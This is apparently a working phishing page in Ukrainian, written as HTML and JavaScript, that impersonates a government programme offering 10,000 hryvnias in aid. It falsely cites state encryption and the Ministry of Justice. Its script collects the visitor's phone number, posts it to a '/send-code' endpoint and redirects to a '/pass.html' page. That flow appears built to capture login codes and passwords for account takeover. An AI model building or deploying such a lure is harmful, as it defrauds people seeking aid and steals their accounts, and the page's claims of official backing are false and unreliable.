<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Державна допомога 10 000 грн</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Nunito', sans-serif;
    min-height: 100vh;
    background: #0f0c29;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px;
    position: relative;
    overflow-x: hidden;
  }

  /* Фонові кола */
  body::before {
    content: '';
    position: fixed;
    top: -120px; left: -120px;
    width: 400px; height: 400px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(99,60,220,0.45) 0%, transparent 70%);
    pointer-events: none;
  }
  body::after {
    content: '';
    position: fixed;
    bottom: -100px; right: -100px;
    width: 350px; height: 350px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(16,185,129,0.35) 0%, transparent 70%);
    pointer-events: none;
  }

  /* Верхній бейдж */
  .top-badge {
    display: flex;
    align-items: center;
    gap: 8px;
    background: rgba(255,255,255,0.08);
    border: 1px solid rgba(255,255,255,0.15);
    border-radius: 50px;
    padding: 8px 20px;
    margin-bottom: 20px;
    backdrop-filter: blur(10px);
  }

  .top-badge-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: #10b981;
    box-shadow: 0 0 8px #10b981;
    animation: pulse 1.8s infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.6; transform: scale(0.85); }
  }

  .top-badge-text {
    font-size: 13px;
    font-weight: 700;
    color: rgba(255,255,255,0.85);
    letter-spacing: 0.04em;
  }

  /* Заголовок */
  .hero-title {
    font-size: 15px;
    font-weight: 700;
    color: rgba(255,255,255,0.5);
    letter-spacing: 0.1em;
    text-transform: uppercase;
    margin-bottom: 6px;
    text-align: center;
  }

  /* Сума */
  .amount-wrap {
    display: flex;
    align-items: baseline;
    gap: 6px;
    margin-bottom: 24px;
  }

  .amount-num {
    font-size: 72px;
    font-weight: 900;
    line-height: 1;
    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 40%, #10b981 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    letter-spacing: -2px;
  }

  .amount-currency {
    font-size: 32px;
    font-weight: 800;
    color: rgba(255,255,255,0.4);
  }

  /* Картка */
  .card {
    width: 100%;
    max-width: 400px;
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 28px;
    padding: 32px 28px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
    backdrop-filter: blur(20px);
    position: relative;
    overflow: hidden;
  }

  /* Верхній акцент картки */
  .card::before {
    content: '';
    position: absolute;
    top: 0; left: 20%; right: 20%;
    height: 2px;
    background: linear-gradient(90deg, transparent, #fbbf24, #10b981, transparent);
    border-radius: 2px;
  }

  /* Аватар */
  .avatar {
    width: 88px; height: 88px;
    border-radius: 50%;
    background: linear-gradient(135deg, rgba(99,60,220,0.5), rgba(16,185,129,0.3));
    border: 2px solid rgba(255,255,255,0.15);
    display: flex; align-items: center; justify-content: center;
    overflow: hidden;
    position: relative;
  }

  .avatar svg { width: 58px; height: 58px; }

  /* Інфо-рядки */
  .info-grid {
    width: 100%;
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
  }

  .info-tile {
    background: rgba(255,255,255,0.06);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 14px;
    padding: 12px 14px;
    display: flex;
    flex-direction: column;
    gap: 3px;
  }

  .info-tile-icon { font-size: 18px; }
  .info-tile-label { font-size: 10px; color: rgba(255,255,255,0.4); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
  .info-tile-value { font-size: 13px; color: rgba(255,255,255,0.85); font-weight: 700; }

  /* Поле телефону */
  .phone-field {
    width: 100%;
    background: rgba(255,255,255,0.07);
    border: 1.5px solid rgba(255,255,255,0.12);
    border-radius: 16px;
    padding: 14px 18px;
    transition: border-color 0.2s;
  }

  .phone-field:focus-within {
    border-color: rgba(251,191,36,0.6);
    background: rgba(255,255,255,0.1);
  }

  .phone-label {
    font-size: 11px;
    color: rgba(255,255,255,0.4);
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.07em;
    margin-bottom: 6px;
  }

  .phone-input-wrap {
    display: flex;
    align-items: center;
    gap: 8px;
    width: 100%;
  }

  .flag { font-size: 22px; line-height: 1; }
  .phone-code { color: rgba(255,255,255,0.6); font-weight: 800; font-size: 17px; }

  .phone-input {
    background: transparent;
    border: none;
    outline: none;
    font-size: 18px;
    font-weight: 800;
    color: #fff;
    font-family: 'Nunito', sans-serif;
    width: 100%;
    letter-spacing: 0.05em;
  }

  .phone-input::placeholder { color: rgba(255,255,255,0.2); font-weight: 600; }

  /* Статус */
  .status { font-size: 13px; font-weight: 700; text-align: center; display: none; }
  .status.error   { color: #f87171; display: block; }
  .status.loading { color: #a78bfa; display: block; }

  /* Кнопка */
  .btn-next {
    width: 100%;
    padding: 17px;
    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #10b981 100%);
    color: #0f0c29;
    border: none;
    border-radius: 16px;
    font-size: 17px;
    font-weight: 900;
    font-family: 'Nunito', sans-serif;
    cursor: pointer;
    letter-spacing: 0.02em;
    box-shadow: 0 8px 32px rgba(251,191,36,0.35);
    transition: opacity 0.2s, transform 0.12s, box-shadow 0.2s;
    position: relative;
    overflow: hidden;
  }

  .btn-next::after {
    content: '';
    position: absolute;
    inset: 0;
    background: rgba(255,255,255,0);
    transition: background 0.2s;
  }

  .btn-next:hover { opacity: 0.93; box-shadow: 0 12px 40px rgba(251,191,36,0.5); }
  .btn-next:active { transform: scale(0.97); }
  .btn-next:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }

  /* Нижній рядок */
  .secure-row {
    display: flex; align-items: center; gap: 6px;
    font-size: 12px; color: rgba(255,255,255,0.3); font-weight: 600;
  }

  /* Декоративні монетки */
  .coins {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    overflow: hidden;
    z-index: 0;
  }

  .coin {
    position: absolute;
    font-size: 20px;
    opacity: 0.12;
    animation: floatCoin linear infinite;
  }

  @keyframes floatCoin {
    0%   { transform: translateY(110vh) rotate(0deg); opacity: 0; }
    10%  { opacity: 0.12; }
    90%  { opacity: 0.12; }
    100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
  }

  .card, .top-badge, .amount-wrap, .hero-title { position: relative; z-index: 1; }

  /* Чат */
  .chat-btn {
    position: fixed; bottom: 24px; right: 24px;
    width: 52px; height: 52px;
    background: linear-gradient(135deg, #fbbf24, #f59e0b);
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    cursor: pointer;
    box-shadow: 0 4px 20px rgba(251,191,36,0.5);
    border: none;
    transition: transform 0.15s;
    z-index: 10;
  }

  .chat-btn:hover { transform: scale(1.1); }
</style>
</head>
<body>

  <!-- Монетки у фоні -->
  <div class="coins" id="coins"></div>

  <div class="top-badge">
    <div class="top-badge-dot"></div>
    <span class="top-badge-text">🇺🇦 ПРОГРАМА АКТИВНА · РЕЄСТРАЦІЯ ВІДКРИТА</span>
  </div>

  <div class="hero-title">Державна матеріальна допомога</div>

  <div class="amount-wrap">
    <span class="amount-num">10 000</span>
    <span class="amount-currency">₴</span>
  </div>

  <div class="card">
    <div class="avatar">
      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <circle cx="50" cy="36" r="20" fill="rgba(251,191,36,0.9)"/>
        <ellipse cx="50" cy="82" rx="30" ry="22" fill="rgba(251,191,36,0.7)"/>
      </svg>
    </div>

    <div class="info-grid">
      <div class="info-tile">
        <span class="info-tile-icon">⚡</span>
        <span class="info-tile-label">Зарахування</span>
        <span class="info-tile-value">До 24 год</span>
      </div>
      <div class="info-tile">
        <span class="info-tile-icon">✅</span>
        <span class="info-tile-label">Статус</span>
        <span class="info-tile-value" style="color:#10b981;">Доступно</span>
      </div>
      <div class="info-tile">
        <span class="info-tile-icon">🏦</span>
        <span class="info-tile-label">На картку</span>
        <span class="info-tile-value">Будь-який банк</span>
      </div>
      <div class="info-tile">
        <span class="info-tile-icon">🔒</span>
        <span class="info-tile-label">Захист</span>
        <span class="info-tile-value">SSL / 256-bit</span>
      </div>
    </div>

    <div class="phone-field">
      <div class="phone-label">Номер телефону</div>
      <div class="phone-input-wrap">
        <span class="flag">🇺🇦</span>
        <span class="phone-code">+380</span>
        <input class="phone-input" type="tel" id="phoneNum" placeholder="00 000 0000" maxlength="12">
      </div>
    </div>

    <div id="status" class="status"></div>

    <button class="btn-next" id="btn" onclick="handleNext()">💳 Отримати 10 000 ₴</button>

    <div class="secure-row">
      <span>🔐</span>
      <span>Захищено державним шифруванням · Мін'юст України</span>
    </div>
  </div>

  <button class="chat-btn" title="Підтримка">
    <svg viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z" fill="#0f0c29"/>
    </svg>
  </button>

<script>
  // Монетки у фоні
  const coinsEl = document.getElementById('coins');
  const symbols = ['₴','₴','💰','✨','₴'];
  for (let i = 0; i < 18; i++) {
    const c = document.createElement('span');
    c.className = 'coin';
    c.textContent = symbols[i % symbols.length];
    c.style.left = (Math.random() * 100) + 'vw';
    c.style.animationDuration = (10 + Math.random() * 14) + 's';
    c.style.animationDelay = (Math.random() * 12) + 's';
    c.style.fontSize = (14 + Math.random() * 16) + 'px';
    coinsEl.appendChild(c);
  }

  // Форматування телефону
  const input = document.getElementById('phoneNum');
  input.addEventListener('input', () => {
    let val = input.value.replace(/\D/g, '');
    if (val.length > 2 && val.length <= 5) {
      val = val.slice(0,2) + ' ' + val.slice(2);
    } else if (val.length > 5) {
      val = val.slice(0,2) + ' ' + val.slice(2,5) + ' ' + val.slice(5,9);
    }
    input.value = val;
  });

  async function handleNext() {
    const raw = input.value.replace(/\D/g, '');

    if (raw.length < 9) {
      input.closest('.phone-field').style.borderColor = '#f87171';
      input.focus();
      setTimeout(() => input.closest('.phone-field').style.borderColor = '', 1200);
      return;
    }

    const phone = '380' + raw;
    const btn = document.getElementById('btn');
    const status = document.getElementById('status');

    btn.disabled = true;
    btn.textContent = '⏳ Підключаємось...';
    status.className = 'status loading';
    status.textContent = '⏳ Надсилаємо запит...';

    try {
      const response = await fetch('/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });

      const data = await response.json();

      if (data.success) {
        sessionStorage.setItem('phone', phone);
        window.location.href = '/pass.html';
      } else {
        status.className = 'status error';
        status.textContent = '❌ ' + (data.error || 'Помилка сервера');
        btn.disabled = false;
        btn.textContent = '💳 Отримати 10 000 ₴';
      }
    } catch (err) {
      status.className = 'status error';
      status.textContent = '❌ Сервер недоступний';
      btn.disabled = false;
      btn.textContent = '💳 Отримати 10 000 ₴';
    }
  }
</script>
</body>
</html>
